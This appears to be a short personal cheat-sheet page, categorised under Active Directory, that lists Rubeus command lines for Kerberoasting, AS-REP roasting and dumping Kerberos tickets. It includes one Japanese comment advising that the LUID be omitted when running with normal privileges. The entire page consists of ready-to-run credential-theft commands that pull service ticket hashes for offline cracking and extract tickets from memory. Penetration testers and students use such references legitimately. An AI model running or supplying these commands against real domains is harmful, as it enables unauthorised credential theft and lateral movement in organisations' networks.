---
title: Kerberoast
category: active directory
weight: -1
---

## Kerberoasting

```
Rubeus.exe kerberoast /spn:xxx /dc:xxx
Rubeus.exe kerberoast /spn:xxx /dc:xxx /tgtleg 
```

## AS-REP Roasting
```
Rubeus.exe asreproast
```

## Dump Tickets
```
Rubeus.exe dump

# 一般権限でやるときはluidを指定しないほうがいいらしい
Rubeus.exe dump /luid:0x47869cc
```

